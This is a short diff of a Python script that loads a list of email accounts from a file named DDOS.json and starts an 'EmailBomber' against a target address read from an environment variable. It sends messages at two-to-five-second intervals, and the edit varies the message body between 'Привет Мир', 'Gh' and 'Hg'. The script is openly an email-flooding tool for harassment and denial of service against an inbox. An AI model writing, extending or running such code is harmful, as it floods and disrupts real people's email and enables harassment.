@@ -11,7 +11,7 @@ def main():
 	with open('../DDOS.json', 'r') as file:
 		json_text = file.read()
 		data = json.loads(json_text)
-	email_bomber = EmailBomber(os.environ["RECEIVER_EMAIL"], "Привет мир", msg="Привет Мир", is_html=True, min_interval=2, max_interval=5)
+	email_bomber = EmailBomber(os.environ["RECEIVER_EMAIL"], "Привет мир", msg=["Привет Мир", "Gh", "Hg"], is_html=True, min_interval=2, max_interval=5)
 	email_bomber.start_DDOS_bombing(data['emails'])
 
 if __name__ == '__main__':
